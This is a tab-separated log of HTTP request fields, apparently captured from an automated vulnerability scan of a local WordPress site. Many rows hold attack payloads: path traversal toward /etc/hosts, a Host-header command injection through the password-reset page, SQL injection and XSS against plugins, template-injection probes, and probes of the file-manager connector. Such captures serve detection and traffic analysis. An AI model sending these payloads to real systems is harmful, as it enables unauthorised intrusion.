http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									90					http://192.168.1.104/web/	1	http://192.168.1.104/web/wp-includes/wlwmanifest.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/wp-includes/wlwmanifest.xml
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104														http://192.168.1.104/web/	1	http://192.168.1.104/web/comments/feed/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/comments/feed/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									92						1	http://192.168.1.104/pHqghUm		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/pHqghUm
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									113						1	http://192.168.1.104/web/		GET				HTTP/1.1																			'"!?-%s				/web/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate,gzip, deflate	en-US,en;q=0.5,en-US,en;q=0.5															Keep-Alive,Keep-Alive										192.168.1.104,192.168.1.104									114,115					"'/<jxqz19496>=()	1,1	http://192.168.1.104/web/,http://192.168.1.104/web/eaYlNlf		GET,GET				HTTP/1.1,HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0,Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/,/web/eaYlNlf
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									94					http://192.168.1.104/web/	1	http://192.168.1.104/web/xmlrpc.php?rsd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/xmlrpc.php?rsd
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									117					http://192.168.1.104/web/	1	http://192.168.1.104/web/2022/02/02/hola-mundo/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/2022/02/02/hola-mundo/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									115						1	http://192.168.1.104/web/		GET				HTTP/1.1																			aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa				/web/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									139					http://192.168.1.104/web/	1	http://192.168.1.104/web/wp-json/wp/v2/users/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/wp-json/wp/v2/users/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									156					${188707-1}	1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive		505	505	multipart/form-data; boundary=X-SMARTSCANNER-BOUNDARY						192.168.1.104									181						1	http://192.168.1.104/web/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									194					http://192.168.1.104/web/	1	http://192.168.1.104/web/pagina-ejemplo/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/pagina-ejemplo/
*/*																	Close										dkGjcdj2y3djasdc															1	http://dkGjcdj2y3djasdc/web/		GET				HTTP/1.1																							/web/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									216						1	http://192.168.1.104/web/		GET				HTTP/1.1																			"'/<jxqz32019>=()				/web/
*/*																	Close		56	56	application/x-www-form-urlencoded						target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}sleep${substr{10}{1}{$tod_log}}8}} null)															1	http://target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}sleep${substr{10}{1}{$tod_log}}8}} null)/web/wp-login.php?action=lostpassword		POST				HTTP/1.1																							/web/wp-login.php?action=lostpassword
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									215						1	http://192.168.1.104/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									236						1	http://192.168.1.104/web/wp-content/themes/Akal/framework/brad-shortcodes/tinymce/preview.php?sc=PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/wp-content/themes/Akal/framework/brad-shortcodes/tinymce/preview.php?sc=PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									279					{{188707-1}}	1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/../../../../../../a/../../../../../../../etc/hosts		GET				HTTP/1.1																							/web/wp-includes/blocks/navigation/../../../../../../a/../../../../../../../etc/hosts
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/../../../../../../../a/../../../../../../../../etc/hosts		GET				HTTP/1.1																							/web/wp-includes/blocks/navigation/../../../../../../../a/../../../../../../../../etc/hosts
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/../../../../../../../../a/../../../../../../../../../etc/hosts		GET				HTTP/1.1																							/web/wp-includes/blocks/navigation/../../../../../../../../a/../../../../../../../../../etc/hosts
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/../../../../../../../../../a/../../../../../../../../../../etc/hosts		GET				HTTP/1.1																							/web/wp-includes/blocks/navigation/../../../../../../../../../a/../../../../../../../../../../etc/hosts
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									302						1	http://192.168.1.104/robots.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/robots.txt
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									305					http://192.168.1.104/web/	1	http://192.168.1.104/web/wp-json/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/wp-json/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									341						1	http://192.168.1.104/web/		GET				HTTP/1.1																			${665722-1}				/web/
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web//www.example.com		GET				HTTP/1.1																							/web//www.example.com
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									379						1	http://192.168.1.104/sitemap.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/sitemap.xml
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									382					http://192.168.1.104/web/	1	http://192.168.1.104/web/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1%20or%201%3DExtractValue%281%2CCoNCaT%280x3a%2C%28md5%28122459%29%29%29%29		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1%20or%201%3DExtractValue%281%2CCoNCaT%280x3a%2C%28md5%28122459%29%29%29%29
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									359					http://192.168.1.104/web/	1	http://192.168.1.104/web/2022/02/02/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/2022/02/02/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									445						1	http://192.168.1.104/web//%0A%0Dh:v		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web//%0A%0Dh:v
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									383					http://192.168.1.104/web/	1	http://192.168.1.104/web/wp-includes/js/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/wp-includes/js/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									500						1	http://192.168.1.104/web/		GET				HTTP/1.1																			{{665722-1}}				/web/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive		96	96	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/	1	http://192.168.1.104/web/wp-content/plugins/videowhisper-video-presentation/vp/c_status.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/wp-content/plugins/videowhisper-video-presentation/vp/c_status.php
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive		0	0							192.168.1.104									480						1	http://192.168.1.104/		TRACE				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									514						1	http://192.168.1.104/server-status		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/server-status
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									515						1	http://192.168.1.104/server-info		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/server-info
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									516						1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/
*/*																	Close										192.168.1.104															1	http://192.168.1.104/icons/.%2e/.%2e/.%2e/.%2e/.%2e/etc/hosts		GET				HTTP/1.1																							/icons/.%2e/.%2e/.%2e/.%2e/.%2e/etc/hosts
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									502						1	http://192.168.1.104/web/xmlrpc.php?rsd=%27%22%21%3F-%25s		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/xmlrpc.php?rsd=%27%22%21%3F-%25s
*/*																	Close										192.168.1.104															1	http://192.168.1.104/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/hosts		GET				HTTP/1.1																							/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/hosts
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive										192.168.1.104									524					http://192.168.1.104/web/	1	http://192.168.1.104/web/wp-includes/blocks/navigation/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/wp-includes/blocks/navigation/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.5															Keep-Alive		133	133	application/x-www-form-urlencoded						192.168.1.104									504					http://192.168.1.104/web/	1	http://192.168.1.104/web/wp-content/plugins/scormcloud/ajax.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0				/web/wp-content/plugins/scormcloud/ajax.php
